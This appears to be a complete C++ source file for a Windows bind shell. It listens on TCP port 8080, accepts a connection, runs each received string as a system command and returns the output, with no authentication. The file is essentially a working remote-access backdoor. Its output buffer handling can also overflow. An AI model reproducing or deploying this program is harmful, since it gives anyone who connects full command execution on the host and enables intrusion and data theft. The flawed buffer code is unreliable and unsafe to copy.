#include<iostream>
#include<string>
#include<WinSock2.h>
#include<windows.h>

#define PORT 8080
#define BUFFER_SIZE 4096

#pragma comment(lib,"ws2_32.lib")

using namespace std;

void ExecuteCommand(const char* command, char* result) {
    FILE* pipe = _popen(command, "r");
    if (pipe == NULL) {
        cout << "Failed to execute command" << endl;
        return;
    }
    while (fgets(result, BUFFER_SIZE, pipe) != NULL) {
        result += strlen(result);  
    }
    _pclose(pipe); 
}

int main() {
    WSADATA wsaDATA;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    char buffer[BUFFER_SIZE];
    char commandResult[BUFFER_SIZE];

    int result = WSAStartup(MAKEWORD(2, 2), &wsaDATA);
    if (result != 0) {
        cerr << "WSAStartup failed: " << result << endl;
        return 1;
    }

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "BIND FAILED" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    listen(serverSocket, 3);
    cout << "Waiting for incoming connections..." << endl;

    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrSize);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Accept failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    cout << "Connection Accepted" << endl;

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        memset(commandResult, 0, BUFFER_SIZE);

        int recvSize = recv(clientSocket, buffer, BUFFER_SIZE-1, 0);
        if (recvSize <= 0) {
            cerr << "Receive Failed";
            break;
        }
        buffer[recvSize] = '\0';
        cout << "Received command: " << buffer << endl;

        ExecuteCommand(buffer, commandResult);
        send(clientSocket, commandResult, strlen(commandResult), 0);
    }
    cout << "Client Disconnected"<<endl;
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
